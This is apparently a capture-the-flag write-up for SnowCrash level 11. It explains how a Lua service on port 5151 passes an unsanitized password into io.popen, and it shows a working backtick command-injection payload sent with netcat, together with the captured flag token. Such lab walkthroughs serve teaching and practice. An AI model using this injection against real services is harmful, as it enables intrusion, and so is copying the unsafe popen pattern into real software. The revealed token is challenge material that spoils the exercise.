# Level 11

There is a Lua file. When executing it, you get the following:

```
level11@SnowCrash:~$ lua level11.lua
lua: level11.lua:3: address already in use
stack traceback:
 [C]: in function 'assert'
 level11.lua:3: in main chunk
 [C]: ?
```

It crashes at these lines:

```lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))
```

The server is already running in the background. Let's use `netcat` to connect to it directly:

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password:
```

We're in. Now, looking closer at the source, the password we send gets passed straight into a shell command without any sanitization:

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

Whatever we type is interpolated directly into `echo <input> | sha1sum`. We can abuse this to inject our own shell commands. Let's try calling `getflag`:

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: getflag
Erf nope..
```

The output isn't returned to us. It just gets piped into `sha1sum`. We need to redirect it somewhere we can read it:

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: getflag > /tmp/exploit
Erf nope..
level11@SnowCrash:~$ cat /tmp/exploit
getflag
```

Close, but `getflag` is being treated as a literal string rather than a command. We need to wrap it in backticks so the shell evaluates it first:

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag` > /tmp/exploit
Erf nope..
level11@SnowCrash:~$ cat /tmp/exploit
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

There you go!
